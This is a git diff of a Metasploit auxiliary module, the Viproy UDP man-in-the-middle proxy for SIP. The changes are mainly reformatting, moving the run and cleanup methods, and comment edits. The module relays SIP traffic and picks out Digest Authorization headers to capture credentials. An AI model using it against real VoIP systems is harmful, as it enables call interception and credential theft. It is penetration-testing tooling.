@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -13,37 +11,60 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(
-        'Name'           => 'Viproy MITM Proxy for UDP',
-        'Version'        => '1',
-        'Description'    => 'MITM Proxy for UDP',
-        'License'        => MSF_LICENSE,
-        'Author'         => 'Fatih Ozavci - viproy.com/fozavci',
-        'References'     =>	[],
+      'Name'           => 'Viproy MITM Proxy for UDP',
+      'Version'        => '1',
+      'Description'    => 'MITM Proxy for UDP',
+      'License'        => MSF_LICENSE,
+      'Author'         => 'Fatih Ozavci - viproy.com/fozavci',
+      'References'     =>	[],
     )
     deregister_options('RHOST','RHOSTS','RPORT')
 
     register_options(
-        [
-            OptAddress.new('PRXCLT_IP',   [true, 'Local IP of UDP Socket for Remote SIP Client']),
-            OptInt.new('PRXCLT_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Client',5061]),
-            OptAddress.new('PRXSRV_IP',   [true, 'Local IP of UDP Socket for Remote SIP Server']),
-            OptInt.new('PRXSRV_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Server',5060]),
-            OptAddress.new('CLIENT_IP',   [true, 'IP of Remote SIP Client']),
-            OptInt.new('CLIENT_PORT',   [true, 'Port of Remote SIP Client',5060]),
-            OptAddress.new('SERVER_IP',   [true, 'IP of Remote SIP Server']),
-            OptInt.new('SERVER_PORT',   [true, 'Port of Remote SIP Server',5060]),
-            OptString.new('LOGFILE',   [ false, "Log file for content"]),
+      [
+        OptAddress.new('PRXCLT_IP',   [true, 'Local IP of UDP Socket for Remote SIP Client']),
+        OptInt.new('PRXCLT_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Client',5061]),
+        OptAddress.new('PRXSRV_IP',   [true, 'Local IP of UDP Socket for Remote SIP Server']),
+        OptInt.new('PRXSRV_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Server',5060]),
+        OptAddress.new('CLIENT_IP',   [true, 'IP of Remote SIP Client']),
+        OptInt.new('CLIENT_PORT',   [true, 'Port of Remote SIP Client',5060]),
+        OptAddress.new('SERVER_IP',   [true, 'IP of Remote SIP Server']),
+        OptInt.new('SERVER_PORT',   [true, 'Port of Remote SIP Server',5060]),
+        OptString.new('LOGFILE',   [ false, "Log file for content"]),
 
-        ], self.class)
+      ], self.class)
 
     register_advanced_options(
-        [
-            OptPath.new('REPLACEFILE',      [ false, "File containing Replacements, one per line"]),
-            OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),
-            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
-        ], self.class)
+      [
+        OptPath.new('REPLACEFILE',      [ false, "File containing Replacements, one per line"]),
+        OptBool.new('DEBUG',   [ false, "Debug Level", false]),
+      ], self.class)
+  end
 
+  #
+  # Start the service
+  #
+  def run
+    # SIP sockets are starting
+    vprint_status("Listening on #{@prxclient_ip}:#{@prxclient_port} for the SIP client.")
+    @prxclient=udpsock(@prxclient_ip,@prxclient_port)
+    vprint_status("Listening on #{@prxserver_ip}:#{@prxserver_port} for the SIP server.")
+    @prxserver=udpsock(@prxserver_ip,@prxserver_port)
+    start_monitor
+    while true
+      # Fix this later
+    end
+  end
 
+  #
+  # Stop the service
+  #
+  def cleanup
+    if ! @prxclient.closed? or ! @prxserver.closed?
+      vprint_status("Closing the server sockets.")
+      @prxclient.close if ! @prxclient.closed?
+      @prxserver.close if ! @prxserver.closed?
+    end
   end
 
   def setup
@@ -73,9 +94,8 @@ class Metasploit3 < Msf::Auxiliary
     return sock
   end
 
-
   #
-  # Start monitors
+  # Start the monitors
   #
   def start_monitor
     [@prxclient,@prxserver].each { |sock|
@@ -87,7 +107,6 @@ class Metasploit3 < Msf::Auxiliary
 
   # Start a SIP socket monitor
   def monitor_socket1(sock)
-    #begin
       while true
         if sock.peerhost != nil
           print_status("Socket : #{sock.peerhost}")
@@ -98,9 +117,6 @@ class Metasploit3 < Msf::Auxiliary
           dispatch_request(srcip,srcport,buf)
         end
       end
-    #rescue ::Exception => e
-    #  print_error("Error #{e}")
-    #end
   end
 
   #Monitor Socket
@@ -149,7 +165,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def prxredirect(sipprx,buf,ip,type)
     vprint_status("Content from "+ip+":\n #{buf}")
-    #buf=replace_port_ip(buf,type)
+
+    # Fix the replacement later
+    # buf=replace_port_ip(buf,type)
     if (buf =~ /^Authorization: Digest \s*(.*)$/i)
       creds=$1
       req_type=buf.split(" ")[0]
@@ -161,7 +179,8 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
-    #buf=replace_it(buf) if @replacement_table
+    # Fix the replacement later
+    # buf=replace_it(buf) if @replacement_table
     logwrite(buf,ip) if @logfile
     sipprx.send(buf)
   end
@@ -230,31 +249,6 @@ class Metasploit3 < Msf::Auxiliary
       logfile.close
     end
     print_status("Logged to #{@logfname}")
-  end
-
-
-  def run
-    # SIP sockets are starting
-    vprint_status("Listening on #{@prxclient_ip}:#{@prxclient_port} for the SIP client.")
-    @prxclient=udpsock(@prxclient_ip,@prxclient_port)
-    vprint_status("Listening on #{@prxserver_ip}:#{@prxserver_port} for the SIP server.")
-    @prxserver=udpsock(@prxserver_ip,@prxserver_port)
-    start_monitor
-    while true
-
-    end
-
-  end
-
-  #
-  # Stop the service
-  #
-  def cleanup
-    if ! @prxclient.closed? or ! @prxserver.closed?
-      vprint_status("Closing the server sockets.")
-      @prxclient.close if ! @prxclient.closed?
-      @prxserver.close if ! @prxserver.closed?
-    end
   end
 
 end
